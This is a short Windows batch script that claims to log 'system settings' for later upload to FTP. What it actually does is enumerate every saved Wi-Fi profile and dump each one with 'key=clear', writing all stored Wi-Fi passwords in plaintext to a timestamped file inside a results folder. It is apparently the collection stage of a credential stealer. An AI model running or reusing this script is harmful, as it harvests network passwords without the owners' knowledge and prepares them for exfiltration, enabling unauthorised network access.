:: Log system settings into .txt file for further sending to FTP

@echo off
:: Delayed vars
setlocal enabledelayedexpansion

:: PL %date% format is YY-MM-DD
for /f "tokens=1-3 delims=/ " %%a in ("%date%") do (
    set year=%%a
    set month=%%b
    set day=%%c
)

for /f "tokens=1-2 delims=:" %%a in ("%time%") do (
    set hour=%%a
    set minute=%%b
)

:: Change  date to wanted format
set new_date=%year%_%month%_%day%_%hour%_%minute%

:: Full path to output file (with logs)
set output_file="%~dp0\Files\Batch_results\Wi-Fi_info_%new_date%.txt"

:: Even if we create files per specific minute, we want to save only latest data
if exist %output_file% del %output_file%

:: Write Wi-Fi profiles into .txt file
netsh wlan show profiles > profiles.txt

:: Without delayed vars, loop can't properly access 'netsh'
for /f "tokens=1,2 delims=:" %%a in ('findstr /R /C:"All User Profile" profiles.txt') do (
    set profile_name=%%b
    set profile_name=!profile_name:~1!
    netsh wlan show profiles name="!profile_name!" key=clear >> %output_file%
    echo. >> %output_file%
)

:: Remove temporary file
del profiles.txt
:: pause
